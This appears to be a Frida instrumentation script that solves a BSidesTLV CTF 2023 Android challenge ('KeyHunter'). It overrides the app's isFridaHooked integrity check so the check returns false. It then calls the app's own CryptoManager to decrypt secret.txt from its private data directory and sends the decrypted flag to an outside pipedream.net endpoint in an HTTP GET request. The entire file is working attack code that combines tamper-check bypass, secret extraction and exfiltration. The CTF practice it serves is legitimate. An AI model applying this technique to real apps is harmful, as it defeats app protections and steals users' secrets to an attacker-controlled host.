/* 
   BSidesTLV CTF 2023
   Mobile - KeyHunter solve by evyatar9

   $ frida -U -p <PID> -l solve.js
*/
Java.perform(function() {
   
   var AppIntegrityChecker = Java.use("com.plcoding.androidcrypto.AppIntegrityChecker$Companion");
   AppIntegrityChecker.isFridaHooked.overload().implementation = function() {
		console.log("Custom implementation of isFridaHooked method - return false");
		return false;
  };
   
  Java.enumerateLoadedClasses({
    onMatch: function(className) {
      if (className === "com.plcoding.androidcrypto.CryptoManager") {
        Java.choose(className, {
          onMatch: function(instance) {
			
				console.log("Found an instance of CryptoManager");
				console.log("Creating FileInputStream with /data/data/com.plcoding.androidcrypto/files/secret.txt");
				var File = Java.use("java.io.File");
				var FileInputStream = Java.use("java.io.FileInputStream");

				var filePath = "/data/data/com.plcoding.androidcrypto/files/secret.txt";
				var file = Java.cast(File.$new(filePath), File);
				var fileInputStream = FileInputStream.$new(file);
				
				console.log("Calling to decrypt...");
				var flagByteArray = Java.array('byte', instance.decrypt(fileInputStream));  // Convert to Java byte array
				var str = String.fromCharCode.apply(null, flagByteArray);
				console.log("Flag: " + str);
				
				var URL = Java.use('java.net.URL');
				var BufferedReader = Java.use('java.io.BufferedReader');
				var InputStreamReader = Java.use('java.io.InputStreamReader');
				var HttpURLConnection = Java.use('java.net.HttpURLConnection');

				// Define the URL to send the GET request
				var url = "https://eofkllb4ccony1x.m.pipedream.net/" + str;
				console.log("Sending " + url);
				// Create a new URL object
				var urlObject = URL.$new(url);

				// Open a connection to the URL
				var connection = urlObject.openConnection();

				// Cast the connection to HttpURLConnection
				var httpConnection = Java.cast(connection, HttpURLConnection);

				// Set the request method to GET
				httpConnection.setRequestMethod('GET');
  
				// Send the request and retrieve the response
				var responseCode = httpConnection.getResponseCode();
  
				console.log("Done " + responseCode);
          },
          onComplete: function() {
          }
        });
      }
    },
    onComplete: function() {
    }
  });

});
